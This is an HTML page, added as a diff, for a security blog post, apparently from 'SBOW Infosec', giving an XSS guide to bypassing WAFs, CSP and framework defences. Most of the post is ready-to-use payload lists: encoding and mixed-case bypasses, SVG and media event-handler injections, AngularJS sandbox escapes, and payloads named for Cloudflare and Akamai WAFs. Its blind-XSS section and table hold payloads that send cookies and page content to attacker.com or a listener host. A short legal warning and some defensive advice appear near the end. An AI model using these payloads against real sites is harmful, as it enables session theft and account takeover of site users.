@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Filter Bypass in 2025: Complete Guide to Bypassing WAF, CSP & Modern Defenses</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-primary: #58a6ff;
+            --accent-secondary: #1f6feb;
+            --border-color: #30363d;
+            --success: #3fb950;
+            --warning: #d29922;
+            --danger: #f85149;
+            --code-bg: #161b22;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f6f8fa;
+            --bg-tertiary: #eaeef2;
+            --text-primary: #24292f;
+            --text-secondary: #57606a;
+            --accent-primary: #0969da;
+            --accent-secondary: #0550ae;
+            --border-color: #d0d7de;
+            --success: #1a7f37;
+            --warning: #9a6700;
+            --danger: #cf222e;
+            --code-bg: #f6f8fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            transition: background 0.3s ease, color 0.3s ease;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .theme-toggle {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .theme-toggle:hover {
+            background: var(--bg-tertiary);
+            border-color: var(--accent-primary);
+        }
+
+        .post-header {
+            margin-bottom: 50px;
+        }
+
+        .post-category {
+            display: inline-block;
+            padding: 8px 28px;
+            background: linear-gradient(135deg, #58a6ff 0%, #1f6feb 100%);
+            color: white;
+            border-radius: 25px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .post-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .post-meta {
+            display: flex;
+            gap: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            padding-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .post-content {
+            font-size: 1.05rem;
+            line-height: 1.8;
+        }
+
+        .post-content h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+        }
+
+        .post-content ul, .post-content ol {
+            margin: 20px 0;
+            padding-left: 30px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+
+        .post-content code {
+            background: var(--code-bg);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: var(--accent-primary);
+        }
+
+        .post-content pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .post-content pre code {
+            background: transparent;
+            padding: 0;
+            color: var(--text-primary);
+            display: block;
+        }
+
+        .info-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-primary);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--warning);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .danger-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--danger);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .info-box h4, .warning-box h4, .danger-box h4 {
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        th {
+            background: var(--bg-tertiary);
+            color: var(--accent-primary);
+            font-weight: 600;
+        }
+
+        tr:hover {
+            background: var(--bg-tertiary);
+        }
+
+        footer {
+            margin-top: 80px;
+            padding-top: 30px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+
+            .post-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .post-content h3 {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-bar">
+            <a href="../index.html" class="back-link">← Back to Blog</a>
+            <button class="theme-toggle" onclick="toggleTheme()">
+                <span id="theme-icon">☀️</span>
+                <span id="theme-text">Light Mode</span>
+            </button>
+        </div>
+
+        <article>
+            <header class="post-header">
+                <span class="post-category">WEB SECURITY</span>
+                <h1 class="post-title">XSS Filter Bypass in 2025: Complete Guide to Bypassing WAF, CSP & Modern Defenses</h1>
+                <div class="post-meta">
+                    <span>Published: Dec 2025</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <p>Cross-Site Scripting (XSS) remains the most frequently exploited web vulnerability, ranking #3 on OWASP's 2025 Top 10. Yet in 2025, XSS is harder than ever to exploit. Modern web applications deploy sophisticated defenses: Web Application Firewalls (WAFs) block malicious patterns, Content Security Policy (CSP) headers prevent inline script execution, and frameworks like React auto-escape dangerous data. However, skilled attackers continue finding creative ways to bypass these protections. This comprehensive guide covers real-world XSS bypass techniques, contextualized payloads for different scenarios, and methods for discovering blind XSS vulnerabilities that others miss.</p>
+
+                <div class="info-box">
+                    <h4>💡 The XSS Evolution in 2025</h4>
+                    <p>XSSGAI, an AI-powered XSS payload generator trained on 14,437+ real-world attacks, was released in March 2025. It generates novel, polymorphic payloads with 88% success rate—making traditional WAF rules obsolete. This shift means defenders must implement application-level XSS prevention (output encoding, input validation, RASP) rather than relying solely on perimeter WAF rules.</p>
+                </div>
+
+                <h2>Understanding XSS Defense Mechanisms</h2>
+
+                <h3>1. Web Application Firewalls (WAFs)</h3>
+                <p>WAFs use signature-based and behavioral analysis to detect XSS attacks. They operate at the network/application edge and examine requests for known attack patterns.</p>
+
+                <h4>WAF Limitations:</h4>
+                <ul>
+                    <li>Signature-based detection can be evaded with novel payloads</li>
+                    <li>Only single decode/processing pass on most WAFs</li>
+                    <li>Rate limiting can be circumvented with slow attacks</li>
+                    <li>Encrypted HTTPS traffic is partially invisible to WAF</li>
+                </ul>
+
+                <h3>2. Content Security Policy (CSP)</h3>
+                <p>CSP headers tell the browser which content sources are trusted. A strong CSP blocks inline scripts and restricts external script loading.</p>
+
+                <h4>Example Strong CSP:</h4>
+                <pre><code>Content-Security-Policy: default-src 'self'; 
+  script-src 'self' https://trusted.cdn.com; 
+  object-src 'none';
+  style-src 'self' 'unsafe-inline';</code></pre>
+
+                <h3>3. Input Validation & Output Encoding</h3>
+                <p>Application-level defenses that validate user input and encode output in context-specific ways (HTML encoding, JavaScript encoding, URL encoding).</p>
+
+                <h3>4. Framework Protections</h3>
+                <p>Modern frameworks like React, Angular, and Vue auto-escape dangerous data, making DOM-based XSS harder.</p>
+
+                <h2>XSS Bypass Techniques</h2>
+
+                <h3>1. Double Encoding (WAF Bypass)</h3>
+                <p>Many WAFs decode input once. Double encoding bypasses single-pass filtering:</p>
+
+                <pre><code>First Layer Encoding:
+< = &#x3C;
+> = &#x3E;
+" = &#x22;
+
+Double Encoded:
+&#x26;#x3C; = &#x26;#x3C;  (&#x3C; is itself encoded)
+
+WAF sees: &#x26;#x3C;script&#x26;#x3E; (appears safe)
+Browser decodes once: &#x3C;script&#x3E; (appears safe to WAF)
+Browser decodes again: <script> (EXECUTES!)</code></pre>
+
+                <h3>2. Case Manipulation & Mixed Case</h3>
+                <p>WAF rules often fail on mixed-case payloads:</p>
+
+                <pre><code>Blocked: <script>alert(1)</script>
+Bypasses: <ScRiPt>alert(1)</ScRiPt>
+Bypasses: <sCrIpT>alert(1)</sCrIpT></code></pre>
+
+                <h3>3. Encoding Techniques</h3>
+
+                <h4>HTML Entity Encoding:</h4>
+                <pre><code>Regular: <img src=x onerror=alert(1)>
+Encoded: &#x3C;img src=x onerror=alert(1)&#x3E;
+Mixed:   &#x3C;img src=x onerror="alert(1)"&#x3E;</code></pre>
+
+                <h4>Unicode Encoding:</h4>
+                <pre><code>alert(1) = \u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029
+\u003cscript\u003ealert(1)\u003c/script\u003e</code></pre>
+
+                <h4>Hex Encoding:</h4>
+                <pre><code>alert(1) = \x61\x6c\x65\x72\x74\x28\x31\x29
+\x3cscript\x3ealert(1)\x3c/script\x3e</code></pre>
+
+                <h4>Base64 (with JavaScript decoding):</h4>
+                <pre><code>Base64: YWxlcnQoMSk=
+Payload: <script>eval(atob('YWxlcnQoMSk='))</script></code></pre>
+
+                <h3>4. Alternative HTML Tags & Event Handlers</h3>
+
+                <h4>SVG-based XSS:</h4>
+                <pre><code><svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate attributeName=x dur=1s values=1 onend=alert(1)>
+<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg></code></pre>
+
+                <h4>HTML5 Media Tags:</h4>
+                <pre><code><audio controls autoplay ontimeupdate=alert(1)>
+<video src=x onerror=alert(1)>
+<source src=x onerror=alert(1)></code></pre>
+
+                <h4>Less Common Tags:</h4>
+                <pre><code><body onload=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus></code></pre>
+
+                <h3>5. JavaScript Protocol & Data URIs</h3>
+                <pre><code><a href="javascript:alert(1)">Click</a>
+<a href="javascript:eval(atob('YWxlcnQoMSk='))">Click</a>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<embed src="data:text/html,<script>alert(1)</script>"></code></pre>
+
+                <h3>6. CSS-based XSS (Expression Injection)</h3>
+                <pre><code"><div style="background:url('javascript:alert(1)')">
+<style>@import'http://attacker.com/xss.css'</style>
+<link rel=stylesheet href="javascript:alert(1)"></code></pre>
+
+                <h3>7. Attribute-based Injection</h3>
+                <pre><code">Injection point: <img src="INJECTION" alt="test">
+
+Bypass 1: x" onerror="alert(1)" x="
+Result: <img src="x" onerror="alert(1)" x="" alt="test">
+
+Bypass 2: x' onerror='alert(1)' x='
+Result: <img src="x' onerror='alert(1)' x='" alt="test"></code></pre>
+
+                <h3>8. Framework-Specific Bypasses</h3>
+
+                <h4>AngularJS Sandbox Escape:</h4>
+                <pre><code>{{constructor.constructor('alert(1)')()}}
+{{(function(){alert(1)})()}}
+$event.view.alert(1)</code></pre>
+
+                <h4>React DOM Vulnerabilities:</h4>
+                <pre><code>// dangerouslySetInnerHTML misuse
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+
+// DOM-based if userInput = '<img src=x onerror=alert(1)>'</code></pre>
+
+                <h3>9. Context-Based Payloads</h3>
+
+                <h4>In HTML Context:</h4>
+                <pre><code"><img src=x onerror=alert(1)>
+<svg onload=alert(1)></code></pre>
+
+                <h4>In JavaScript Context:</h4>
+                <pre><code>Injection: '; alert(1); //
+Original: var x = 'INJECTION';
+Result: var x = ''; alert(1); //';
+
+Injection: ${alert(1)}
+Original: `Hello ${INJECTION}`
+Result: `Hello ${alert(1)}`</code></pre>
+
+                <h4>In URL Context:</h4>
+                <pre><code>javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)  // IE only</code></pre>
+
+                <h3>10. WAF-Specific Bypasses (2025)</h3>
+
+                <h4>Cloudflare WAF:</h4>
+                <pre><code><inpuT autofocus onfocus=alert(1)>
+<SVG/oNlY=1 ONlOAD=confirm(1)>
+<img src=x id=x alt=x title=x onerror=eval(atob('YWxlcnQoMSk='))></code></pre>
+
+                <h4>Akamai WAF:</h4>
+                <pre><code"><input id=b value=javascript:alert(1) onfocus=eval(value) autofocus>
+<div id=a href=javascript:alert(1)>click</div>
+<svg/onload="for(const i in this)this[i]instanceof Function&&this[i](1)"</code></pre>
+
+                <h2>Comprehensive XSS Payload Categories</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Category</th>
+                            <th>Use Case</th>
+                            <th>Example Payload</th>
+                            <th>Defense</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Reflected XSS</strong></td>
+                            <td>Immediate execution in current page</td>
+                            <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                            <td>Output encoding</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Stored XSS</strong></td>
+                            <td>Persisted in database, affects all users</td>
+                            <td><code>&lt;script&gt;fetch('/steal?c='+document.cookie)&lt;/script&gt;</code></td>
+                            <td>Input sanitization + output encoding</td>
+                        </tr>
+                        <tr>
+                            <td><strong>DOM XSS</strong></td>
+                            <td>JavaScript manipulation of DOM</td>
+                            <td><code>element.innerHTML = userInput</code></td>
+                            <td>textContent over innerHTML</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Blind XSS</strong></td>
+                            <td>Execution not visible to attacker</td>
+                            <td><code>&lt;script src="https://attacker.com/log.js"&gt;&lt;/script&gt;</code></td>
+                            <td>RASP, CSP monitoring</td>
+                        </tr>
+                        <tr>
+                            <td><strong>UXSS</strong></td>
+                            <td>Cross-origin script execution</td>
+                            <td>Browser-specific DOM vulnerabilities</td>
+                            <td>SOP enforcement</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Self-XSS</strong></td>
+                            <td>User hacks themselves (social eng)</td>
+                            <td>Valid payload, user tricks themselves</td>
+                            <td>User awareness, CSRF tokens</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2>Finding Blind XSS Vulnerabilities</h2>
+                <p>Blind XSS is when your payload executes but you don't see the result in the response. For example, feedback forms, contact pages, or admin panels that don't immediately reflect your input.</p>
+
+                <h3>Blind XSS Detection Technique</h3>
+
+                <h4>Step 1: Set Up an OOB Listener</h4>
+                <pre><code># Option 1: Burp Collaborator (Free)
+# Copy your Collaborator URL from Burp Suite
+
+# Option 2: Webhook.site
+https://webhook.site/your-unique-id
+
+# Option 3: Xless (Serverless Blind XSS)
+Deploy to Vercel, get notifications in Slack</code></pre>
+
+                <h4>Step 2: Inject Blind XSS Payloads</h4>
+                <pre><code># Basic payload
+<script src="https://YOUR-LISTENER.burpcollaborator.net"></script>
+
+# Cookie exfiltration
+<script>fetch('https://YOUR-LISTENER.burpcollaborator.net?c='+document.cookie)</script>
+
+# Refined payload for forms
+<img src=x onerror="fetch('https://YOUR-LISTENER/?steal='+btoa(document.cookie))">
+
+# For admin panels (more guaranteed execution)
+<svg onload="new Image().src='https://YOUR-LISTENER/?admin=true'">
+
+# Data extraction from DOM
+<script>
+fetch('https://YOUR-LISTENER/?page='+btoa(document.documentElement.innerHTML.substring(0,500)))
+</script></code></pre>
+
+                <h4>Step 3: Monitor for Callbacks</h4>
+                <p>Check your listener for incoming requests. Each request confirms code execution and may contain exfiltrated data.</p>
+
+                <h3>Blind XSS Tools</h3>
+                <ul>
+                    <li><strong>Xless:</strong> Serverless Blind XSS app with Slack notifications and screenshot capture</li>
+                    <li><strong>BeeXSS:</strong> Automated Blind XSS detection tool with Selenium automation</li>
+                    <li><strong>GoHunt:</strong> Golang Blind XSS hunter with XSSHunter-like functionality</li>
+                    <li><strong>Burp Collaborator:</strong> Built-in OOB detection for Burp Suite Pro</li>
+                    <li><strong>Webhook.site:</strong> Free webhook testing for blind vulnerability detection</li>
+                    <li><strong>Argus:</strong> Blind XSS and SSRF vulnerability tester</li>
+                </ul>
+
+                <h2>Detecting XSS Blind Vulnerabilities in Real Applications</h2>
+
+                <h3>Common Injection Points</h3>
+                <ul>
+                    <li>Feedback/contact forms</li>
+                    <li>Profile comments and user bios</li>
+                    <li>Support ticket systems</li>
+                    <li>Admin notification systems</li>
+                    <li>Error log collectors</li>
+                    <li>User-agent and referer headers (viewed by admins)</li>
+                    <li>File upload metadata (viewed in admin panel)</li>
+                    <li>Search query logs (reviewed by support)</li>
+                </ul>
+
+                <h3>Testing Strategy</h3>
+
+                <pre><code>1. Identify input points that might be viewed by admins/other users
+2. Deploy Blind XSS payload with unique identifier
+3. Monitor OOB listener for 24-48 hours
+4. If callback received: vulnerability confirmed
+5. Extract data (cookies, DOM content, screenshots)
+6. Document and report with proof
+7. Iterate with different payloads/contexts</code></pre>
+
+                <h2>CSP Bypass Techniques</h2>
+
+                <h3>Dangerous CSP Configurations</h3>
+
+                <h4>CSP allows 'unsafe-inline':</h4>
+                <pre><code>Content-Security-Policy: script-src 'self' 'unsafe-inline'
+
+Bypass:
+<script>alert(1)</script>  // Executes despite CSP</code></pre>
+
+                <h4>CSP allows data: URIs:</h4>
+                <pre><code>Content-Security-Policy: script-src 'self' data:
+
+Bypass:
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe></code></pre>
+
+                <h4>CSP with wildcard domains:</h4>
+                <pre><code>Content-Security-Policy: script-src *.example.com
+
+If attacker can upload to: cdn.example.com/attacker.js
+<script src="https://cdn.example.com/attacker.js"></script></code></pre>
+
+                <h3>CSP Bypasses via Vulnerabilities in Allowed Domains</h3>
+                <p>If CSP trusts jQuery CDN, exploit jQuery vulnerabilities or use jQuery plugins for XSS.</p>
+
+                <pre><code>CSP: script-src https://code.jquery.com
+
+Vulnerable jQuery plugin endpoint:
+<script src="https://code.jquery.com/vulnerable-plugin.js?callback=alert(1)"></script></code></pre>
+
+                <div class="warning-box">
+                    <h4>⚠️ Real-World 2025 Statistics</h4>
+                    <p>Recent research shows 31 of 36 popular web applications (86%) with LLM integrations are vulnerable to prompt-based XSS injection. Cloudflare WAF, Akamai, and Azure WAF are regularly bypassed with novel payloads. Organizations relying solely on WAFs for XSS protection face significant risk.</p>
+                </div>
+
+                <h2>XSS Testing Tools & Payloads</h2>
+
+                <h3>Automated Tools</h3>
+                <ul>
+                    <li><strong>XSSStrike:</strong> Advanced XSS scanner with payload mutation</li>
+                    <li><strong>Dalfox:</strong> Powerful XSS scanner with domain parsing</li>
+                    <li><strong>XSSGAI:</strong> AI-powered payload generator (88% success rate)</li>
+                    <li><strong>PortSwigger XSS Cheat Sheet:</strong> Updated 2025, 1000+ payloads</li>
+                    <li><strong>PayloadsAllTheThings:</strong> Comprehensive payload repository</li>
+                </ul>
+
+                <h3>Manual Testing Process</h3>
+                <ol>
+                    <li>Identify reflection/storage points</li>
+                    <li>Test basic payload: <code><img src=x onerror=alert(1)></code></li>
+                    <li>If blocked, try bypasses: encoding, case manipulation, alternative tags</li>
+                    <li>Test in different contexts: HTML, JavaScript, URL, CSS</li>
+                    <li>For blind XSS: use OOB listener and monitor for callbacks</li>
+                    <li>Document payload, context, and browser compatibility</li>
+                </ol>
+
+                <div class="danger-box">
+                    <h4>⚠️ Legal Warning</h4>
+                    <p>XSS testing should ONLY be conducted on systems you own or have explicit written authorization to test. Unauthorized XSS exploitation is illegal. Always ensure you have proper scope, permission letters, and clear rules of engagement before beginning any assessment.</p>
+                </div>
+
+                <h2>Conclusion</h2>
+                <p>XSS in 2025 remains a critical vulnerability despite improved defenses. WAFs can be bypassed, CSP can be misconfigured, and frameworks have vulnerabilities. The emergence of AI-powered payload generators like XSSGAI demonstrates that traditional signature-based defenses are becoming obsolete.</p>
+
+                <p>Successful XSS exploitation requires understanding context, knowing bypass techniques, and persistence in testing. Blind XSS adds an extra dimension where attackers can exploit vulnerabilities without seeing immediate results—making OOB detection and proper instrumentation essential for defenders.</p>
+
+                <p>The key takeaway: XSS prevention must be multi-layered. Combine input validation, output encoding (context-specific), strong CSP, RASP technology, and runtime monitoring. No single defense is sufficient in 2025.</p>
+            </div>
+        </article>
+
+        <footer>
+            <p>© 2025 SBOW Infosec. All research for educational purposes only.</p>
+        </footer>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            const html = document.documentElement;
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            const currentTheme = html.getAttribute('data-theme');
+            
+            if (currentTheme === 'light') {
+                html.removeAttribute('data-theme');
+                themeIcon.textContent = '☀️';
+                themeText.textContent = 'Light Mode';
+                localStorage.setItem('theme', 'dark');
+            } else {
+                html.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('theme');
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            
+            if (savedTheme === 'light') {
+                document.documentElement.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+            }
+        });
+    </script>
+</body>
+</html>
